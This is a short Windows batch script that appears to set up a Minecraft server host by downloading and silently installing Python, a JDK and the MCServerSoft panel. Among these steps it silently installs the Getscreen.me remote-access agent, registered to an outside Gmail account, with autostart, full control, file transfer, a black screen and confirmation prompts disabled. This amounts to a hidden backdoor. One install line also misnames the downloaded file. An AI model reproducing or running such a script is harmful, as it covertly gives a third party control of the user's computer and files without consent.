@echo off
cd /d %USERPROFILE%/Desktop
curl -O https://www.python.org/ftp/python/3.12.1/python-3.12.1-amd64.exe
python-3.12.1-amd64.exe /passive InstallAllUsers=1 Shortcuts=0 SimpleInstallDescription="Python installing..."
curl -O https://download.oracle.com/java/20/archive/jdk-20.0.2_windows-x64_bin.msi
msiexec /a "jdk-20.0.2_windows-x64_bin.msi" /passive /norestart
curl -O https://getscreen.me/download/getscreen.msi
msiexec /i getscreen.ms /qn REGISTER="julinlenovoj@gmail.com" CONFIG="name='Server' language=fi autostart=true nonadmin=true control=true fast_access=true file_transfer=true audio_calls=false black_screen=true disable_confirmation=true"
curl -o mcserversoft.zip https://api.mcserversoft.com/v1/download/update/latest/zipped
powershell Expand-Archive -Path "mcserversoft.zip" -DestinationPath "mcserversoft"
del python-3.12.1-amd64.exe
del jdk-20.0.2_windows-x64_bin.msi
del mcserversoft.zip